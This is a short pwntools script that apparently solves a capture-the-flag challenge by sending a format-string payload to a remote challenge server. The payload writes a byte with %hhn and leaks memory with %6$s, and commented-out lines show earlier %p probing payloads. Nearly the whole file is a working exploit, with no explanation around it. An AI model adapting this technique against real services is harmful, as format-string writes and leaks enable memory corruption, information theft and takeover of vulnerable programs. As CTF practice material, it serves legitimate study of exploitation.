from pwn import *

# elf = context.binary = ELF('./vuln', checksec=False)
# libc = ELF('libc.so.6', checksec=False)
context.update(
    terminal='kitty',
    log_level='debug'
)

c = '''
b* main
c
'''

p = remote('form.chal.imaginaryctf.org', 1337)
# p = elf.process()
# gdb.attach(p,c)

# p.sendline(b'%p %p %p %p %p %p %p %p %p %p')
# p.sendline(b'%c%c%c%c%c%c%p')
p.sendline(b'%c'*5 + f'%{0xa0-5}c%hhn%6$s'.encode())
p.recvuntil(b'\xd0')
print(p.recvline(0))

p.interactive()